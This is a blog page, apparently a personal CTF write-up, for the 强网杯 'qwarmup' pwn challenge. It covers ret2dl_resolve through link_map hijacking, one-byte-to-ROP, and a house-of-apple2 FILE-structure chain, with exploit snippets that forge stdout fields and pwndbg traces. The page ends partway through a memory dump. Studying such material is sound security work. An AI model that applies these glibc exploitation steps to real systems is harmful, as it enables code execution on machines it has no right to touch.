

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.jpg">
  <link rel="icon" href="/img/avatar.jpg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Csc8">
  <meta name="keywords" content="">
  
    <meta name="description" content="主要涉及dl_reslove、onebyteROP和IO链三个点">
<meta property="og:type" content="article">
<meta property="og:title" content="强网杯qwarmup">
<meta property="og:url" content="http://csc8.github.io/2023/04/06/qwarmup/index.html">
<meta property="og:site_name" content="Csc8_Blog">
<meta property="og:description" content="主要涉及dl_reslove、onebyteROP和IO链三个点">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://csc8.github.io/img/wallhaven-zyxvqy.jpg">
<meta property="article:published_time" content="2023-04-06T04:08:18.297Z">
<meta property="article:modified_time" content="2023-04-06T04:46:29.642Z">
<meta property="article:author" content="Csc8">
<meta property="article:tag" content="堆题">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://csc8.github.io/img/wallhaven-zyxvqy.jpg">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>强网杯qwarmup - Csc8_Blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"csc8.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  

  

  

  

  

  



  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Csc8_Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                友链
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/wallhaven-zyxvqy.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="强网杯qwarmup"></span>
          
        </div>

        
          
  <div class="mt-3">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-author" aria-hidden="true"></i>
        Csc8
      </span>
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-04-06 12:08" pubdate>
          2023年4月6日 中午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          23k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          195 分钟
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">强网杯qwarmup</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="qwarmup"><a href="#qwarmup" class="headerlink" title="qwarmup"></a>qwarmup</h1><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><p>malloc 内存分配位置及进程内存布局：<a target="_blank" rel="noopener" href="https://blog.csdn.net/zhouguoqionghai/article/details/112771864">https://blog.csdn.net/zhouguoqionghai/article/details/112771864</a></p>
<p><strong>简而言之：当malloc申请一个大内存时，系统通过mmap进行内存分配，此时的堆块，可以申请到libc.so.6附近</strong></p>
<p><strong>本题中，malloc(0xf0000)</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; vmmap<br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>    <span class="hljs-number">0x564d47886000</span>     <span class="hljs-number">0x564d47887000</span> r--p     <span class="hljs-number">1000</span> <span class="hljs-number">0</span>      /home/chen/桌面/match/qw_s6/qwarmup/qwarmup<br>    <span class="hljs-number">0x564d47887000</span>     <span class="hljs-number">0x564d47888000</span> r-xp     <span class="hljs-number">1000</span> <span class="hljs-number">1000</span>   /home/chen/桌面/match/qw_s6/qwarmup/qwarmup<br>    <span class="hljs-number">0x564d47888000</span>     <span class="hljs-number">0x564d47889000</span> r--p     <span class="hljs-number">1000</span> <span class="hljs-number">2000</span>   /home/chen/桌面/match/qw_s6/qwarmup/qwarmup<br>    <span class="hljs-number">0x564d47889000</span>     <span class="hljs-number">0x564d4788a000</span> r--p     <span class="hljs-number">1000</span> <span class="hljs-number">2000</span>   /home/chen/桌面/match/qw_s6/qwarmup/qwarmup<br>    <span class="hljs-number">0x564d4788a000</span>     <span class="hljs-number">0x564d47890000</span> rw-p     <span class="hljs-number">6000</span> <span class="hljs-number">3000</span>   /home/chen/桌面/match/qw_s6/qwarmup/qwarmup<br>    <span class="hljs-number">0x564d47d96000</span>     <span class="hljs-number">0x564d47db7000</span> rw-p    <span class="hljs-number">21000</span> <span class="hljs-number">0</span>      [heap]<br>    <br>    <span class="hljs-number">0x7fe747a6b000</span>     <span class="hljs-number">0x7fe747b5f000</span> rw-p    f4000 <span class="hljs-number">0</span>      [anon_7fe747a6b] --- heap_base+<span class="hljs-number">0x10</span><br>    <br>    <span class="hljs-number">0x7fe747b5f000</span>     <span class="hljs-number">0x7fe747b8b000</span> r--p    <span class="hljs-number">2</span>c000 <span class="hljs-number">0</span>      /home/chen/桌面/match/qw_s6/qwarmup/libc.so<span class="hljs-number">.6</span><br>    <span class="hljs-number">0x7fe747b8b000</span>     <span class="hljs-number">0x7fe747cf8000</span> r-xp   <span class="hljs-number">16</span>d000 <span class="hljs-number">2</span>c000  /home/chen/桌面/match/qw_s6/qwarmup/libc.so<span class="hljs-number">.6</span><br>    <span class="hljs-number">0x7fe747cf8000</span>     <span class="hljs-number">0x7fe747d4e000</span> r--p    <span class="hljs-number">56000</span> <span class="hljs-number">199000</span> /home/chen/桌面/match/qw_s6/qwarmup/libc.so<span class="hljs-number">.6</span><br>    <span class="hljs-number">0x7fe747d4e000</span>     <span class="hljs-number">0x7fe747d51000</span> r--p     <span class="hljs-number">3000</span> <span class="hljs-number">1</span>ee000 /home/chen/桌面/match/qw_s6/qwarmup/libc.so<span class="hljs-number">.6</span><br>    <span class="hljs-number">0x7fe747d51000</span>     <span class="hljs-number">0x7fe747d54000</span> rw-p     <span class="hljs-number">3000</span> <span class="hljs-number">1f</span>1000 /home/chen/桌面/match/qw_s6/qwarmup/libc.so<span class="hljs-number">.6</span><br>    <br>    <span class="hljs-number">0x7fe747d54000</span>     <span class="hljs-number">0x7fe747d63000</span> rw-p     f000 <span class="hljs-number">0</span>      [anon_7fe747d54]<br>    <span class="hljs-number">0x7fe747d63000</span>     <span class="hljs-number">0x7fe747d65000</span> r--p     <span class="hljs-number">2000</span> <span class="hljs-number">0</span>      /home/chen/桌面/match/qw_s6/qwarmup/ld-linux-x86<span class="hljs-number">-64.</span>so<span class="hljs-number">.2</span><br>    <span class="hljs-number">0x7fe747d65000</span>     <span class="hljs-number">0x7fe747d8c000</span> r-xp    <span class="hljs-number">27000</span> <span class="hljs-number">2000</span>   /home/chen/桌面/match/qw_s6/qwarmup/ld-linux-x86<span class="hljs-number">-64.</span>so<span class="hljs-number">.2</span><br>    <span class="hljs-number">0x7fe747d8c000</span>     <span class="hljs-number">0x7fe747d98000</span> r--p     c000 <span class="hljs-number">29000</span>  /home/chen/桌面/match/qw_s6/qwarmup/ld-linux-x86<span class="hljs-number">-64.</span>so<span class="hljs-number">.2</span><br>    <span class="hljs-number">0x7fe747d98000</span>     <span class="hljs-number">0x7fe747d9a000</span> r--p     <span class="hljs-number">2000</span> <span class="hljs-number">34000</span>  /home/chen/桌面/match/qw_s6/qwarmup/ld-linux-x86<span class="hljs-number">-64.</span>so<span class="hljs-number">.2</span><br>    <span class="hljs-number">0x7fe747d9a000</span>     <span class="hljs-number">0x7fe747d9c000</span> rw-p     <span class="hljs-number">2000</span> <span class="hljs-number">36000</span>  /home/chen/桌面/match/qw_s6/qwarmup/ld-linux-x86<span class="hljs-number">-64.</span>so<span class="hljs-number">.2</span><br>    <span class="hljs-number">0x7ffc99a12000</span>     <span class="hljs-number">0x7ffc99a33000</span> rw-p    <span class="hljs-number">21000</span> <span class="hljs-number">0</span>      [<span class="hljs-built_in">stack</span>]<br>    <span class="hljs-number">0x7ffc99a9f000</span>     <span class="hljs-number">0x7ffc99aa3000</span> r--p     <span class="hljs-number">4000</span> <span class="hljs-number">0</span>      [vvar]<br>    <span class="hljs-number">0x7ffc99aa3000</span>     <span class="hljs-number">0x7ffc99aa5000</span> r-xp     <span class="hljs-number">2000</span> <span class="hljs-number">0</span>      [vdso]<br><span class="hljs-number">0xffffffffff600000</span> <span class="hljs-number">0xffffffffff601000</span> --xp     <span class="hljs-number">1000</span> <span class="hljs-number">0</span>      [vsyscall]<br></code></pre></td></tr></table></figure>



<p>根据<code>heap_base</code>，计算偏移</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># libc - heap offset</span><br>libc_base = <span class="hljs-number">0xf4000</span> - <span class="hljs-number">0x10</span><br><br>ld_base = <span class="hljs-number">0x325000</span> - <span class="hljs-number">0x10</span><br><br><span class="hljs-comment"># link_map offset</span><br>link_map_offset = <span class="hljs-number">0x3602e0</span> - <span class="hljs-number">0x10</span><br><br><span class="hljs-comment">#`pwndbg&gt; p _rtld_global，得到link_map地址</span><br></code></pre></td></tr></table></figure>





<h3 id="ret2dl-reslove"><a href="#ret2dl-reslove" class="headerlink" title="ret2dl_reslove"></a>ret2dl_reslove</h3><p><strong>学习：</strong><a target="_blank" rel="noopener" href="https://syst3mfailure.io/ret2dl_resolve/">https://syst3mfailure.io/ret2dl_resolve/</a></p>
<p>​			<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/184099#h2-4">https://www.anquanke.com/post/id/184099#h2-4</a></p>
<p>​			<a target="_blank" rel="noopener" href="https://kr0emer.com/2021/08/13/%E5%85%B3%E4%BA%8E_dl_runtime_resolve%E5%88%86%E6%9E%90%E4%B8%8Eret2dlresolve/#64%E4%BD%8D%E4%B8%8B%E4%BC%AA%E9%80%A0fake-link-map%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB%EF%BC%88Partial-RELRO%E4%B8%94%E6%97%A0%E9%9C%80%E6%B3%84%E9%9C%B2%E5%9C%B0%E5%9D%80%EF%BC%89">_dl_runtime_reslove分析以及ret2dlreslove</a></p>
<p>了解在延迟加载期间查找函数时使用的不同结构。</p>
<p>跟了下这几篇博客， 然后自己调了调</p>
<p><code>_rtld_global</code>指向<code>link_map</code></p>
<ul>
<li><p><code>ptype struct link_map</code>：查看link_map定义</p>
</li>
<li><p><code>p &amp;((struct link_map*)0)-&gt;l_info</code>：查看l_info成员偏移</p>
</li>
<li><p><code>p &amp;((struct link_map*)0)-&gt;l_info</code>：</p>
</li>
<li><p><code>pwndbg&gt; p _rtld_global    </code> –&gt; <code> _ns_loaded = 0x7f814c8852e0</code>  得到link_map地址</p>
</li>
<li><p><code>pwndbg&gt; p *(struct link_map*)  0x7f814c8852e0</code>  查看link_map结构体内指向地址</p>
</li>
</ul>
<h3 id="One-byte-to-ROP"><a href="#One-byte-to-ROP" class="headerlink" title="One byte to ROP"></a>One byte to ROP</h3><p>了解下原理和思路</p>
<p><a target="_blank" rel="noopener" href="https://hackmd.io/@pepsipu/ry-SK44pt%EF%BC%88%E5%8E%9F%E4%BD%9C%E8%80%85%E9%93%BE%E6%8E%A5%EF%BC%8C%E5%89%8D%E4%B8%A4%E5%A4%A9%E7%9C%8B%E9%93%BE%E6%8E%A5%E6%8C%82%E4%BA%86%EF%BC%8C%E5%90%8E%E9%9D%A2%E5%8F%88%E5%A5%BD%E4%BA%86%EF%BC%89">https://hackmd.io/@pepsipu/ry-SK44pt（原作者链接，前两天看链接挂了，后面又好了）</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/LMS57/Nightmare-Writeup%EF%BC%88%E5%8F%A6%E4%B8%80%E4%B8%AA%E4%BD%9C%E8%80%85%EF%BC%8C%E5%8F%A6%E4%B8%80%E4%B8%AA%E6%80%9D%E8%B7%AF%EF%BC%89">https://github.com/LMS57/Nightmare-Writeup（另一个作者，另一个思路）</a></p>
<p><strong>qwarmup思路：</strong></p>
<ol>
<li><p>利用<code>_dl_fixup_</code>函数，通过修改<code>link_map-&gt;l_addr</code>，使回填的函数填到<code>write@got</code>某个偏移的地方–由于没有正确返回got，所以每次都会查找</p>
<p>上述文章将偏移修改到<code>_Exit@got</code>，此题可以利用libc地址前面8位的高位为0的特点，覆盖在bss段的size，让程序进入死循环。</p>
</li>
<li><p><code>_dl_lookup_symbol_x</code>函数的第一个参数就是待查找函数的函数名，而<code>sym-&gt;st_name</code>对于同一个函数而言是一个固定值（write &#x3D; 34），而<code>strtab</code>则是来源于于libc上的全局结构体<code>link_map</code></p>
<p>可以劫持<code>link_map-&gt;l_info[DT_STRTAB]</code>，使其指向可控内存段，达到任意函数调用。</p>
</li>
<li><p><code>DT_STRTAB</code>在elf中，由于没有泄露任何地址，目前是通过偏移进行任意地址写，这里找到<code>DT_DEBUG</code>这个表是指向libc地址，可以通过改写最低位，使<code>link_map-&gt;l_info[DT_STRTAB]</code>指向libc地址，然后我们在<code>DT_DEBUG+34</code>的地方写入需要调用的函数。</p>
</li>
</ol>
<h3 id="IO流"><a href="#IO流" class="headerlink" title="IO流"></a>IO流</h3><p><strong>仅作记录</strong></p>
<p><strong>在调试过程中，发现之前不懂的一点: 在伪造&#x2F;修改IO结构体后，触发<code>_IO_flush_all_lookup</code>时，设置不同IO_vtable，最后寄存器都是如何设置的</strong></p>
<h4 id="IO链-ROP链图解"><a href="#IO链-ROP链图解" class="headerlink" title="IO链+ROP链图解"></a>IO链+ROP链图解</h4><p><strong>思路部分会讲解该图的实现</strong></p>
<p><img src="/../md/22.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h4 id="pwndbg命令"><a href="#pwndbg命令" class="headerlink" title="pwndbg命令"></a>pwndbg命令</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">定位_IO_2_1_stdout结构体</span><br>p stdout  <br>ptype stdout<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">查看_IO_2_1_stdout内部的各处内容</span><br>p  *(struct _IO_FILE_plus *) stdout<br>x /35xg 0x7fxxxxxxx<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">计算stdout内部变量的地址/偏移</span><br>p &amp;stdout-&gt;_flags<br>p &amp;stdout-&gt;_mod<br>p &amp;stdout-&gt;_unused2  + 20  #vtable<br>p &amp;stdout-&gt;_wide_data      #_wide_data<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">查看stdout对应的wide_data结构体内容,该题对应的是_IO_wide_data_1</span><br>p  *(struct _IO_wide_data *) stdout<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">查看对应wide_data内部变量地址/偏移</span><br>p &amp;stdout-&gt;_wide_data-&gt;_IO_write_base<br>p &amp;stdout-&gt;_wide_data-&gt;_IO_read_base<br>p &amp;stdout-&gt;_wide_data-&gt;_wide_vtable<br></code></pre></td></tr></table></figure>





<h4 id="调试流程"><a href="#调试流程" class="headerlink" title="调试流程"></a>调试流程</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#通过 _dl_fixup触发_IO_flush_all<br>write<br>	_IO_wfile_overflow<br>		_IO_wdoallocbuf<br>			*(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)<br>				Magic<br>					rdx = [rdi+8] (rdx = heap_base+0x10) --&gt; call [rdx+0x20]<br>						setcontext+61<br>							orw<br><br>► 0x55fe7ca9e4d1    call   write@plt                &lt;write@plt&gt;<br><br>► 0x7fe4a7653c6f &lt;_IO_flush_all_lockp+207&gt;    call   qword ptr [rax + 0x18]        &lt;_IO_wfile_overflow&gt;<br><br>► 0x7fe4a764cd20 &lt;_IO_wfile_overflow+544&gt;    call   _IO_wdoallocbuf                &lt;_IO_wdoallocbuf&gt;<br><br>► 0x7fe4a764a6e8 &lt;_IO_wdoallocbuf+40&gt;    call   qword ptr [rax + 0x68]        &lt;getkeyserv_handle+528&gt;<br>rax: 0x7fe4a77c09a0 (_IO_wide_data_1)<br>rax + 0x68: Magic<br><br>► 0x7fe4a77151e8 &lt;getkeyserv_handle+536&gt;    call   qword ptr [rdx + 0x20]        &lt;setcontext+61&gt;<br>rdx: 0x7fe4a74da000(heap_base+0x10)<br><br></code></pre></td></tr></table></figure>



<p><strong>house of apple2的链子1–条件</strong></p>
<ul>
<li>flags: ~(2 | 0x8 | 0x800)</li>
<li>rdi+8:  heap_base+0x10 </li>
<li>vtable: _IO_wfile_jumps</li>
<li><code>_IO_write_ptr&gt;_IO_write_base</code></li>
<li>_wide_data不变，即为<code>_IO_wide_data_1</code><ul>
<li>_wide_data-&gt;_IO_write_base:  0</li>
<li>_wide_data-&gt;_IO_buf_base:  0</li>
<li>_wide_data-&gt;_wide_vtable:  heap_base+0x30</li>
<li>_wide_data-&gt;_wide_vtable-&gt;doallocate : heap_base+0x30+0x68 : Magic</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># _IO_2_1_stdout_</span><br>write(<span class="hljs-number">0x2E7770</span> , p64(c_uint32(~(<span class="hljs-number">2</span> | <span class="hljs-number">0x8</span> | <span class="hljs-number">0x800</span>)).value))  <span class="hljs-comment">#flags: rdi</span><br>write(<span class="hljs-number">0x2E7770</span>+<span class="hljs-number">8</span>, p64(heap_base+<span class="hljs-number">0x10</span>)) <span class="hljs-comment">#[rdi+8]</span><br>write(<span class="hljs-number">0x2E7770</span>+<span class="hljs-number">216</span>, p64(_IO_wfile_jumps))  <span class="hljs-comment">#vtable</span><br>write(<span class="hljs-number">0x2E7770</span>+<span class="hljs-number">0x20</span>, p32(<span class="hljs-number">0</span>))	<span class="hljs-comment"># _IO_write_base</span><br>write(<span class="hljs-number">0x2E7770</span>+<span class="hljs-number">0x28</span>, p32(<span class="hljs-number">0x1</span>))	<span class="hljs-comment"># _IO_write_ptr&gt;_IO_write_base</span><br><br><span class="hljs-comment">#  _IO_2_1_stdout_ -&gt; _wide_data</span><br><span class="hljs-comment">#write(0x2E69A0, )  #_IO_wide_data_1</span><br>write(<span class="hljs-number">0x2E6990</span>+<span class="hljs-number">24</span>, p8(<span class="hljs-number">0</span>)) <span class="hljs-comment">#_wide_data-&gt;_IO_write_base</span><br>write(<span class="hljs-number">0x2E6990</span>+<span class="hljs-number">48</span>, p8(<span class="hljs-number">0</span>)) <span class="hljs-comment">#_wide_data-&gt;_IO_buf_base</span><br>write(<span class="hljs-number">0x2E6990</span>+<span class="hljs-number">224</span>, p64(heap_base+<span class="hljs-number">0x30</span>)) <span class="hljs-comment">#_wide_data-&gt;_wide_vtable</span><br></code></pre></td></tr></table></figure>



<p><strong>_IO_2_1_stdout结构体内容 &amp;&amp; 源码</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)<br> 	   || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span><br> 	       &amp;&amp; fp-&gt;_mode &gt; <span class="hljs-number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr<br> 				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))<br> 	   )<br> 	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<br><br>    <span class="hljs-comment">//_IO_2_1_stdout_+0xc0: _mode&lt;=0</span><br>    <span class="hljs-comment">//_IO_2_1_stdout_+0x28: _IO_write_ptr &gt; _IO_2_1_stdout_+0x20: _IO_write_base </span><br>    <span class="hljs-comment">//第一次没满足条件,改了之后就可以继续跟进了</span><br></code></pre></td></tr></table></figure>



<p><strong>修改后的IO内容</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pwndbg&gt; x /35xg 0x7fd340863780<br>0x7fd340863780 &lt;_IO_2_1_stdout_&gt;:		0x00000000fffff7f5	0x00007fd34057c000<br>0x7fd340863790 &lt;_IO_2_1_stdout_+16&gt;:	0x00007fd340863803	0x00007fd340863803<br>0x7fd3408637a0 &lt;_IO_2_1_stdout_+32&gt;:	0x00007fd300000000	0x00007fd300000001<br>0x7fd3408637b0 &lt;_IO_2_1_stdout_+48&gt;:	0x00007fd340863804	0x00007fd340863803<br>0x7fd3408637c0 &lt;_IO_2_1_stdout_+64&gt;:	0x00007fd340863804	0x0000000000000000<br>0x7fd3408637d0 &lt;_IO_2_1_stdout_+80&gt;:	0x0000000000000000	0x0000000000000000<br>0x7fd3408637e0 &lt;_IO_2_1_stdout_+96&gt;:	0x0000000000000000	0x00007fd340862aa0<br>0x7fd3408637f0 &lt;_IO_2_1_stdout_+112&gt;:	0x0000000000000001	0xffffffffffffffff<br>0x7fd340863800 &lt;_IO_2_1_stdout_+128&gt;:	0x0000000000000000	0x00007fd340865750<br>0x7fd340863810 &lt;_IO_2_1_stdout_+144&gt;:	0xffffffffffffffff	0x0000000000000000<br>0x7fd340863820 &lt;_IO_2_1_stdout_+160&gt;:	0x00007fd3408629a0	